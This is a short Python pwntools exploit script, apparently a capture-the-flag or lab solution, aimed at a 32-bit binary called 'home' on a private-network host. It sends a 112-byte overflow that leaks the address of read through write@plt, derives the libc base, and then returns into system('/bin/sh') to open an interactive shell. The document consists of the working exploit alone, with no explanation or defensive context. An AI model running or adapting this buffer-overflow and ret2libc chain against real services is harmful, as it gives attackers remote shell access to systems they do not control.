from pwn import *
context.log_level = "debug"
#p = process("./home")
p = remote("192.168.203.159",8888)

e = ELF('./home')

vul = e.symbols["vul"]
write_plt = e.plt["write"]
read_got = e.got["read"]

p1 = "A"*112+p32(write_plt)+p32(vul)+p32(1)+p32(read_got)+p32(4)

# stdin 0 , stdout 1  ,stderr 2
#write_plt(1,read_got,4) 
p.recv(0xa)
p.sendline(p1)

# system = read - read_off + sys_off
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

read_addr = u32(p.recv(4))

libc_base = read_addr - libc.symbols["read"]
sys = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh").next()

# system("/bin/sh")
p2 = "A"*112+p32(sys)+"BBBB"+p32(bin_sh)
p.sendline(p2)
p.interactive()

